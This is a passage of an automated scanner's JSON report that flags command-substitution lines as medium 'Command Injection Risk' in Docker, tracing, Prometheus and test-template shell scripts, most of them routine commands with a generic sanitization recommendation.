      "evidence": "$(basename \"$0\") -b myapp:latest",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
      "line_number": 69,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") --json myapp:latest",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
      "line_number": 150,
      "issue": "Command substitution in shell",
      "evidence": "echo \"$(awk \"BEGIN {printf \\\"%.2f\\\", $bytes/1024}\")KB\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
      "line_number": 152,
      "issue": "Command substitution in shell",
      "evidence": "echo \"$(awk \"BEGIN {printf \\\"%.2f\\\", $bytes/1048576}\")MB\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
      "line_number": 154,
      "issue": "Command substitution in shell",
      "evidence": "echo \"$(awk \"BEGIN {printf \\\"%.2f\\\", $bytes/1073741824}\")GB\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
      "line_number": 165,
      "issue": "Command substitution in shell",
      "evidence": "total_layers=$(docker history \"$image\" --no-trunc --format \"{{.Size}}\" | wc -l)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
      "line_number": 181,
      "issue": "Command substitution in shell",
      "evidence": "base_image=$(docker image inspect \"$image\" --format='{{.Config.Image}}')",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
      "line_number": 188,
      "issue": "Command substitution in shell",
      "evidence": "user=$(docker image inspect \"$image\" --format='{{.Config.User}}')",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
      "line_number": 195,
      "issue": "Command substitution in shell",
      "evidence": "healthcheck=$(docker image inspect \"$image\" --format='{{.Config.Healthcheck}}')",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
      "line_number": 202,
      "issue": "Command substitution in shell",
      "evidence": "layers=$(docker history \"$image\" --quiet | wc -l)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
      "line_number": 260,
      "issue": "Command substitution in shell",
      "evidence": "content=$(cat \"$original_dockerfile\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
      "line_number": 294,
      "issue": "Command substitution in shell",
      "evidence": "$(echo \"$issues\" | sed 's/^/    \"/; s/$/\"/' | paste -sd ',' -)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
      "line_number": 297,
      "issue": "Command substitution in shell",
      "evidence": "$(echo \"$recommendations\" | sed 's/^/    \"/; s/$/\"/' | paste -sd ',' -)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
      "line_number": 355,
      "issue": "Command substitution in shell",
      "evidence": "size_bytes=$(get_image_size \"$image\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
      "line_number": 357,
      "issue": "Command substitution in shell",
      "evidence": "size_human=$(human_size \"$size_bytes\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
      "line_number": 360,
      "issue": "Command substitution in shell",
      "evidence": "layers=$(docker history \"$image\" --quiet | wc -l)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
      "line_number": 363,
      "issue": "Command substitution in shell",
      "evidence": "issues=$(check_optimizations \"$image\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
      "line_number": 366,
      "issue": "Command substitution in shell",
      "evidence": "recommendations=$(generate_recommendations \"$image\" \"$size_bytes\" \"$size_human\" \"$issues\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
      "line_number": 397,
      "issue": "Command substitution in shell",
      "evidence": "original_size=$(get_image_size \"$image\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
      "line_number": 399,
      "issue": "Command substitution in shell",
      "evidence": "optimized_size=$(get_image_size \"$optimized_image\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
      "line_number": 402,
      "issue": "Command substitution in shell",
      "evidence": "reduction=$(awk \"BEGIN {printf \\\"%.1f\\\", 100 - ($optimized_size * 100.0 / $original_size)}\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
      "line_number": 406,
      "issue": "Command substitution in shell",
      "evidence": "print_info \"Original:  $(human_size \"$original_size\")\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
      "line_number": 407,
      "issue": "Command substitution in shell",
      "evidence": "print_info \"Optimized: $(human_size \"$optimized_size\")\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
      "line_number": 37,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") --url <service-url> [OPTIONS]",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
      "line_number": 50,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") --url http://localhost:8000/api/users",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
      "line_number": 53,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") --url http://localhost:8000 --format b3",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
      "line_number": 56,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") --url http://localhost:8000 \\\\",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
      "line_number": 60,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") --url http://localhost:8000 --json",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
      "line_number": 121,
      "issue": "Command substitution in shell",
      "evidence": "printf '%032x' $((RANDOM * RANDOM * RANDOM * RANDOM))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
      "line_number": 126,
      "issue": "Command substitution in shell",
      "evidence": "printf '%016x' $((RANDOM * RANDOM))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
      "line_number": 162,
      "issue": "Command substitution in shell",
      "evidence": "local timestamp=$(date +%s)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
      "line_number": 163,
      "issue": "Command substitution in shell",
      "evidence": "local random=$(printf '%024x' $((RANDOM * RANDOM * RANDOM)))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
      "line_number": 173,
      "issue": "Command substitution in shell",
      "evidence": "local trace_id=$(generate_trace_id)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
      "line_number": 174,
      "issue": "Command substitution in shell",
      "evidence": "local span_id=$(generate_span_id)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
      "line_number": 181,
      "issue": "Command substitution in shell",
      "evidence": "local traceparent=$(generate_w3c_traceparent \"$trace_id\" \"$span_id\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
      "line_number": 195,
      "issue": "Command substitution in shell",
      "evidence": "local xray_trace_id=\"1-$(date +%s)-${trace_id:0:24}\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
      "line_number": 211,
      "issue": "Command substitution in shell",
      "evidence": "response=$(eval \"$curl_cmd '$url'\" 2>&1) || {",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
      "line_number": 219,
      "issue": "Command substitution in shell",
      "evidence": "response_headers=$(cat \"/tmp/test_propagation_headers_$$.txt\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
      "line_number": 236,
      "issue": "Command substitution in shell",
      "evidence": "received_trace_id=$(echo \"$response_headers\" | grep -i \"traceparent:\" | sed 's/.*00-\\([^-]*\\).*/\\1/')",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
      "line_number": 242,
      "issue": "Command substitution in shell",
      "evidence": "received_trace_id=$(echo \"$response_headers\" | grep -i \"X-B3-TraceId:\" | awk '{print $2}' | tr -d '\\r')",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
      "line_number": 248,
      "issue": "Command substitution in shell",
      "evidence": "received_trace_id=$(echo \"$response_headers\" | grep -i \"b3:\" | sed 's/.*b3: \\([^-]*\\).*/\\1/')",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
      "line_number": 254,
      "issue": "Command substitution in shell",
      "evidence": "received_trace_id=$(echo \"$response_headers\" | grep -i \"uber-trace-id:\" | sed 's/.*uber-trace-id: \\([^:]*\\).*/\\1/')",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
      "line_number": 260,
      "issue": "Command substitution in shell",
      "evidence": "received_trace_id=$(echo \"$response_headers\" | grep -i \"X-Amzn-Trace-Id:\" | sed 's/.*Root=\\([^;]*\\).*/\\1/')",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
      "line_number": 281,
      "issue": "Command substitution in shell",
      "evidence": "local trace_id=$(generate_trace_id)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
      "line_number": 282,
      "issue": "Command substitution in shell",
      "evidence": "local span_id=$(generate_span_id)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
      "line_number": 286,
      "issue": "Command substitution in shell",
      "evidence": "result1=$(test_propagation \"$url1\" \"$format\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
      "line_number": 288,
      "issue": "Command substitution in shell",
      "evidence": "local propagated1=$(echo \"$result1\" | cut -d'|' -f1)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
      "line_number": 297,
      "issue": "Command substitution in shell",
      "evidence": "result2=$(test_propagation \"$url2\" \"$format\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
      "line_number": 299,
      "issue": "Command substitution in shell",
      "evidence": "local propagated2=$(echo \"$result2\" | cut -d'|' -f1)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
      "line_number": 300,
      "issue": "Command substitution in shell",
      "evidence": "local trace_preserved2=$(echo \"$result2\" | cut -d'|' -f2)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
      "line_number": 301,
      "issue": "Command substitution in shell",
      "evidence": "local received_trace_id2=$(echo \"$result2\" | cut -d'|' -f4)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
      "line_number": 311,
      "issue": "Command substitution in shell",
      "evidence": "local propagated=$(echo \"$result\" | cut -d'|' -f1)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
      "line_number": 312,
      "issue": "Command substitution in shell",
      "evidence": "local trace_preserved=$(echo \"$result\" | cut -d'|' -f2)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
      "line_number": 313,
      "issue": "Command substitution in shell",
      "evidence": "local sent_trace_id=$(echo \"$result\" | cut -d'|' -f3)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
      "line_number": 314,
      "issue": "Command substitution in shell",
      "evidence": "local received_trace_id=$(echo \"$result\" | cut -d'|' -f4)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
      "line_number": 325,
      "issue": "Command substitution in shell",
      "evidence": "\"passed\": $([ \"$propagated\" == \"true\" ] && [ \"$trace_preserved\" == \"true\" ] && echo \"true\" || echo \"false\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
      "line_number": 364,
      "issue": "Command substitution in shell",
      "evidence": "result=$(test_propagation \"$URL\" \"$FORMAT\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
      "line_number": 368,
      "issue": "Command substitution in shell",
      "evidence": "result=$(test_multihop \"$URL\" \"$DOWNSTREAM_URL\" \"$FORMAT\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/prometheus-monitoring/resources/scripts/test_exporter.sh",
      "line_number": 149,
      "issue": "Command substitution in shell",
      "evidence": "local start_time=$(date +%s.%N)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/prometheus-monitoring/resources/scripts/test_exporter.sh",
      "line_number": 154,
      "issue": "Command substitution in shell",
      "evidence": "local end_time=$(date +%s.%N)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/prometheus-monitoring/resources/scripts/test_exporter.sh",
      "line_number": 155,
      "issue": "Command substitution in shell",
      "evidence": "local duration=$(echo \"$end_time - $start_time\" | bc)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/prometheus-monitoring/resources/scripts/test_exporter.sh",
      "line_number": 182,
      "issue": "Command substitution in shell",
      "evidence": "local total_lines=$(wc -l < \"$metrics_file\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/prometheus-monitoring/resources/scripts/test_exporter.sh",
      "line_number": 230,
      "issue": "Command substitution in shell",
      "evidence": "TOTAL_METRICS=$(echo \"$metric_names\" | wc -l)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/prometheus-monitoring/resources/scripts/test_exporter.sh",
      "line_number": 302,
      "issue": "Command substitution in shell",
      "evidence": "TOTAL_HELP=$(grep -c '^# HELP ' \"$metrics_file\" || true)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/prometheus-monitoring/resources/scripts/test_exporter.sh",
      "line_number": 303,
      "issue": "Command substitution in shell",
      "evidence": "TOTAL_TYPE=$(grep -c '^# TYPE ' \"$metrics_file\" || true)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/prometheus-monitoring/resources/scripts/test_exporter.sh",
      "line_number": 312,
      "issue": "Command substitution in shell",
      "evidence": "local metrics_count=$(echo \"$metric_names\" | wc -l)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/prometheus-monitoring/resources/scripts/test_exporter.sh",
      "line_number": 316,
      "issue": "Command substitution in shell",
      "evidence": "local missing=$((metrics_count - TOTAL_HELP))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/prometheus-monitoring/resources/scripts/test_exporter.sh",
      "line_number": 323,
      "issue": "Command substitution in shell",
      "evidence": "local missing=$((metrics_count - TOTAL_TYPE))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/prometheus-monitoring/resources/scripts/test_exporter.sh",
      "line_number": 339,
      "issue": "Command substitution in shell",
      "evidence": "TOTAL_SAMPLES=$(grep -v '^#' \"$metrics_file\" | grep -v '^$' | wc -l)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/prometheus-monitoring/resources/scripts/test_exporter.sh",
      "line_number": 344,
      "issue": "Command substitution in shell",
      "evidence": "local avg_cardinality=$((TOTAL_SAMPLES / TOTAL_METRICS))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/prometheus-monitoring/resources/scripts/test_exporter.sh",
      "line_number": 378,
      "issue": "Command substitution in shell",
      "evidence": "local types=$(grep '^# TYPE ' \"$metrics_file\" | awk '{print $4}' | sort | uniq -c)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/prometheus-monitoring/resources/scripts/test_exporter.sh",
      "line_number": 405,
      "issue": "Command substitution in shell",
      "evidence": "local issues_json=$(printf '%s\\n' \"${ISSUES[@]}\" | jq -R -s -c 'split(\"\\n\")[:-1]')",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/prometheus-monitoring/resources/scripts/test_exporter.sh",
      "line_number": 406,
      "issue": "Command substitution in shell",
      "evidence": "local warnings_json=$(printf '%s\\n' \"${WARNINGS[@]}\" | jq -R -s -c 'split(\"\\n\")[:-1]')",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/metrics-instrumentation/resources/scripts/test_exporter.sh",
      "line_number": 27,
      "issue": "Command substitution in shell",
      "evidence": "HELP_TEXT=\"Usage: $(basename \"$0\") [OPTIONS]",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/metrics-instrumentation/resources/scripts/test_exporter.sh",
      "line_number": 41,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") --url http://localhost:8080/metrics",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/metrics-instrumentation/resources/scripts/test_exporter.sh",
      "line_number": 44,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") --file exporters.txt",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/metrics-instrumentation/resources/scripts/test_exporter.sh",
      "line_number": 47,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") --url http://localhost:8080/metrics --json",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/metrics-instrumentation/resources/scripts/test_exporter.sh",
      "line_number": 50,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") --url http://localhost:8080/metrics --verbose",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/metrics-instrumentation/resources/scripts/test_exporter.sh",
      "line_number": 172,
      "issue": "Command substitution in shell",
      "evidence": "content_type=$(curl -s -I -m \"$TIMEOUT\" \"$url\" 2>/dev/null | grep -i \"content-type\" | cut -d: -f2 | tr -d '[:space:]')",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/metrics-instrumentation/resources/scripts/test_exporter.sh",
      "line_number": 255,
      "issue": "Command substitution in shell",
      "evidence": "metrics_with_help=$(grep -c \"^# HELP \" \"$metrics_file\" || true)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/metrics-instrumentation/resources/scripts/test_exporter.sh",
      "line_number": 258,
      "issue": "Command substitution in shell",
      "evidence": "metrics_with_type=$(grep -c \"^# TYPE \" \"$metrics_file\" || true)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/metrics-instrumentation/resources/scripts/test_exporter.sh",
      "line_number": 260,
      "issue": "Command substitution in shell",
      "evidence": "local help_percentage=$((metrics_with_help * 100 / (total_metrics + 1)))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/metrics-instrumentation/resources/scripts/test_exporter.sh",
      "line_number": 261,
      "issue": "Command substitution in shell",
      "evidence": "local type_percentage=$((metrics_with_type * 100 / (total_metrics + 1)))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/metrics-instrumentation/resources/scripts/test_exporter.sh",
      "line_number": 324,
      "issue": "Command substitution in shell",
      "evidence": "error_percentage=$((bad_names * 100 / total_metrics))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/metrics-instrumentation/resources/scripts/test_exporter.sh",
      "line_number": 389,
      "issue": "Command substitution in shell",
      "evidence": "metric_count=$(grep -v \"^#\" \"$metrics_file\" | grep -c \"^[a-zA-Z]\" || true)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/metrics-instrumentation/resources/scripts/test_exporter.sh",
      "line_number": 421,
      "issue": "Command substitution in shell",
      "evidence": "metrics_file=$(mktemp)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/metrics-instrumentation/resources/scripts/test_exporter.sh",
      "line_number": 489,
      "issue": "Command substitution in shell",
      "evidence": "echo \"    \\\"passed\\\": $((${#urls[@]} - failed)),\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/test-driven-development/resources/scripts/generate_test_template.sh",
      "line_number": 49,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") LANGUAGE NAME [OPTIONS]",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/test-driven-development/resources/scripts/generate_test_template.sh",
      "line_number": 68,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") python Calculator --framework pytest",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/test-driven-development/resources/scripts/generate_test_template.sh",
      "line_number": 71,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") typescript UserService --framework jest",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/test-driven-development/resources/scripts/generate_test_template.sh",
      "line_number": 74,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") python OrderProcessor --style bdd",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/test-driven-development/resources/scripts/generate_test_template.sh",
      "line_number": 77,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") rust string_utils",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/test-driven-development/resources/scripts/generate_test_template.sh",
      "line_number": 80,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") go Validator",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/engineering/test-driven-development/resources/scripts/generate_test_template.sh",
      "line_number": 349,
      "issue": "Backtick command execution",
      "evidence": "it(\\`should return \\${expected}\\`, () => {",
